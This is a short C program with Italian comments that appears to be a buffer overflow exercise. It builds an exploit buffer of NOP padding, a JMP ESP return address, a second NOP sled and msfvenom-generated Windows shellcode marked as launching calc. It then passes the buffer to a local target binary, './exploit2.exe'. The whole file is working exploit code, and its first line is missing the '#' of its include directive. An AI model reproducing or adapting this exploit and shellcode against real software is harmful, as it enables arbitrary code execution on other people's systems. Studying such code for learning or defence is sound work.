include <stdlib.h>
int main(){

	char buffer[] = "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90" 
					"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
					"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
					"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
					"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"  /* padding di 92 byte */
          
					"\xef\x5f\xec\x77"  /* JMP ESP */
          
					"\x90\x90\x90\x90\x90\x90\x90\x90"  /* ulteriore nop sled */
          
					"\xdb\xde\xbe\x23\x35\xcf\x49\xd9\x74\x24\xf4\x5b\x31\xc9\xb1"     /* payload windows/exec calc msfvenom */
					"\x31\x31\x73\x18\x03\x73\x18\x83\xc3\x27\xd7\x3a\xb5\xcf\x95"
					"\xc5\x46\x0f\xfa\x4c\xa3\x3e\x3a\x2a\xa7\x10\x8a\x38\xe5\x9c"
					"\x61\x6c\x1e\x17\x07\xb9\x11\x90\xa2\x9f\x1c\x21\x9e\xdc\x3f"
					"\xa1\xdd\x30\xe0\x98\x2d\x45\xe1\xdd\x50\xa4\xb3\xb6\x1f\x1b"
					"\x24\xb3\x6a\xa0\xcf\x8f\x7b\xa0\x2c\x47\x7d\x81\xe2\xdc\x24"
					"\x01\x04\x31\x5d\x08\x1e\x56\x58\xc2\x95\xac\x16\xd5\x7f\xfd"
					"\xd7\x7a\xbe\x32\x2a\x82\x86\xf4\xd5\xf1\xfe\x07\x6b\x02\xc5"
					"\x7a\xb7\x87\xde\xdc\x3c\x3f\x3b\xdd\x91\xa6\xc8\xd1\x5e\xac"
					"\x97\xf5\x61\x61\xac\x01\xe9\x84\x63\x80\xa9\xa2\xa7\xc9\x6a"
					"\xca\xfe\xb7\xdd\xf3\xe1\x18\x81\x51\x69\xb4\xd6\xeb\x30\xd2"
					"\x29\x79\x4f\x90\x2a\x81\x50\x84\x42\xb0\xdb\x4b\x14\x4d\x0e"
					"\x28\xea\x07\x13\x18\x63\xce\xc1\x19\xee\xf1\x3f\x5d\x17\x72"
					"\xca\x1d\xec\x6a\xbf\x18\xa8\x2c\x53\x50\xa1\xd8\x53\xc7\xc2"
					"\xc8\x37\x86\x50\x90\x99\x2d\xd1\x33\xe6";


	execl("./exploit2.exe","exploit2",buffer,0);    /* passiamo i byte del buffer all'eseguibile target */

	return 0;
}


